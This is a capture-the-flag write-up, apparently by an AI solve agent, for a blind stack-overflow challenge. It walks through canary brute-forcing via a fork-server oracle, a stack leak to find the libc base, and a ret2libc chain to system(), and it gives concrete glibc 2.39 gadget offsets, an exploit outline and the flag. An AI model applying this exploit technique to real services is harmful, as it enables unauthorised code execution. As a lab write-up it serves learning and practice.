---
title: "neve"
ctf: "CryoVault Finals"
date: 2026-10-24
category: pwn
difficulty: hard
points: 500
flag_format: "isfcr{...}"
author: "solve agent"
---

# neve

## Summary

Blind pwn with **no binary supplied** (`files: []`, 0 solves). The relay service
(`nc 0.cloud.chals.io 18435`) is a fork-per-connection server with a stack
overflow, stack canary, and non-PIE binary. Recover the canary byte-by-byte
through a "did the child survive" oracle, use a hijacked return into
`write(4, buf+144, n)` as a sliding stack reader, derive the buffer address and
libc base from the leaked startup frame, then ret2libc `system()` to run
`cat /chall/flag.txt 1>&4` on the socket (fd 4).

## Solution

### Step 1: Protocol and frame layout (recovered black-box)

```
server -> "neve relay up.\n" "neve> "
client -> uint16_be length + payload
server -> "relayed <length>.\n" "neve> "     (loops; length 0 closes)
```

The reply is printed by `main` *after* the handler returns, so a wrong canary
byte (or a bad return) suppresses it. Stack layout recovered by probing:

| offset | contents |
|---|---|
| 0..87 | `buf[88]` (read destination) |
| 88..95 | stack canary |
| 96..135 | five saved callee regs (112 = conn fd `4`, 120 = next header size `2`) |
| 136..143 | saved RIP |

Two useful gadgets/sites inside the 4 KiB of text at `0x400000`:

* `0x4006b2` — `write(4, buf+144, n)`: because a payload of length `n` fills
  `[buf, buf+n)`, the **last 144 bytes of the response are untouched original
  stack** at `[buf+n, buf+n+144)`. Sliding `n` walks the whole stack.
* `0x40084d` — main's reply printer (valid return).

### Step 2: Canary (fork server ⇒ one canary per epoch)

A wrong canary byte aborts before the reply, so 256 guesses per byte with a
1-byte-shorter payload (the untouched tail keeps the original bytes) recovers it
in ~7 minutes at 5 conn/s. `canary[0]` is always `0x00`. Canaries rotate when
the platform restarts the container (`00c6cee9be5d58be`, `001efbb9eb83c395`,
`001241766c335604`, `00ae74870dbcfe04`, `006845f61c4b96c2` were all observed),
so the exploit re-derives it on demand.

### Step 3: Stack leak ⇒ buffer address and libc base

One `n = 144` leak already contains everything needed from the startup frame:

| window offset | meaning |
|---|---|
| `D+176` | saved stack pointer, equal to `D + 0x228` |
| `D+184` | `0x400a0e` — layout fingerprint, proves the epoch/frame match |
| `D+264` | libc return address = `libc_base + 0x2a1ca` |

`0x2a1ca` is the return address of `call rax` (the call to `main`) inside
`__libc_start_call_main`; the companion pointer at `D+424` is `+0xC1` further on
(the call to `__libc_start_call_main`), and that exact pair is unique to Ubuntu
24.04's glibc 2.39 in libc.rip's database. Cross-checks applied by the script:
page-aligned base, `D % 16 == 0`, `[D+272] - D == 0x150`, and the auxv
`AT_RANDOM`/`AT_PLATFORM` strings give the same `D` on a full slide dump
(`D+985` holds the 16 canary-seed bytes, `D+1049` the string `x86_64`).

### Step 4: ret2libc — and the two traps

```
RIP = base + 0x10f88b   pop rdi ; ret
[D+144] = D + 168       "cat /chall/flag.txt 1>&4"
[D+152] = base + 0x10f88c   plain ret
[D+160] = base + 0x58750    system
[D+168] = command string
```

Two things cost most of the time and are worth recording:

1. **Patch-level offsets matter.** The remote is
   `libc6 2.39-0ubuntu8.8`, not 8.4/8.7. `system` and `/bin/sh` are stable
   (`0x58750`, `0x1cb42f`) but gadget offsets shift per patch
   (`pop rdi; ret` = `0x10f75b`/`0x10f78b`/`0x10f88b` for 8.4/8.7/8.8) — the
   wrong one just segfaults. The exploit probes candidates newest-first and is
   validated with in-epoch oracles (`sleep(4)` must block ~4 s; `pop rdi; ret`
   into `0x400668` must print `no seam there`).
2. **16-byte stack alignment.** `system()`'s prologue uses `movaps`, so its
   entry `rsp` must be `8 (mod 16)`. The saved RIP sits at `D+136` and `D` is
   16-aligned, so a bare `pop rdi; ret -> system` enters at `0 (mod 16)` and
   dies. The extra plain `ret` at `[D+152]` fixes it. The same alignment
   sensitivity explained why several early "ret gadget" probes silently failed.

Only binary decoys exist in `.text` (`isfcr{sw33p_d3c0y_n3v3_a1}`,
`isfcr{n0_4rg_d3c0y_n3v3_b2}`, `isfcr{pl4nt_d3c0y_n3v3_c3}`) — all `d3c0y`,
all rejected; the real flag is a file, `/chall/flag.txt`, readable only after
code execution.

### Solve script

`exploit.py` in this directory. It recovers the canary (or takes
`--canary`), performs the `n = 144` leak, derives `buf`/`libc_base`, and sends
the ret2libc frame. Observed run:

```text
[*] canary: 006845f61c4b96c2
[*] leaking stack ...
[*] buf = 0x7ffdfc11b200   libc base = 0x7096d5566000
[*] trying pop rdi=0x10f88b system=0x58750
isfcr{wr1t3_wh4t_wh3r3_pl4nt_p4th_b4_0p3n_n3v3}

FLAG: isfcr{wr1t3_wh4t_wh3r3_pl4nt_p4th_b4_0p3n_n3v3}
```

```python
# exploit.py (full copy kept next to this writeup)
#  1. canary oracle: probe(b"A"*88 + prefix + guess) -> child survives?
#  2. leak: RIP=0x4006b2, payload length 144 -> out[n-144:n] is stack at D+n
#       D = [D+176] - 0x228 ; base = [D+264] - 0x2a1ca
#  3. chain: pop rdi ; cmd ; ret ; system  with cmd at D+168
```

## Flag

```
isfcr{wr1t3_wh4t_wh3r3_pl4nt_p4th_b4_0p3n_n3v3}
```

(`md5 /chall/flag.txt` = `303a6b45f2f1a15039215cc0adce727c`, read twice.)
